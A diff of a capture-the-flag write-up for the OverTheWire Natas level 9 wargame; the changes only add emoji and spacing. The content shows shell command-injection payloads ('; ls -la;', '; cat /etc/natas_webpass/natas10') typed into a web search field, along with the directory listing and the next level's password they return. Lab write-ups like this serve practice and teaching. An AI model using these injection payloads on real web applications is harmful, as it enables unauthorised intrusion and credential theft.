@@ -46,9 +46,9 @@ if($key != "") {
 <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 </div>
 
-http://natas9.natas.labs.overthewire.org/dictionary.txt             # Nothing useful
+http://natas9.natas.labs.overthewire.org/dictionary.txt ⌨️            # Nothing useful
 
-Find words containing: ; ls -la;
+Find words containing: ; ls -la; ⌨️
 Output:
 total 476
 drwxr-x---  2 natas9 natas9   4096 Jul 28 18:49 .
@@ -61,7 +61,8 @@ drwxr-xr-x 38 root   root     4096 Jul 28 18:49 ..
 Find words containing: ; cat /etc/natas_webpass/natas10 #
 Output:
 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu 🔐
-Find words containing: ; cat /etc/natas_webpass/natas10;
+
+Find words containing: ; cat /etc/natas_webpass/natas10; ⌨️
 Output:
 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu 🔐
 ```
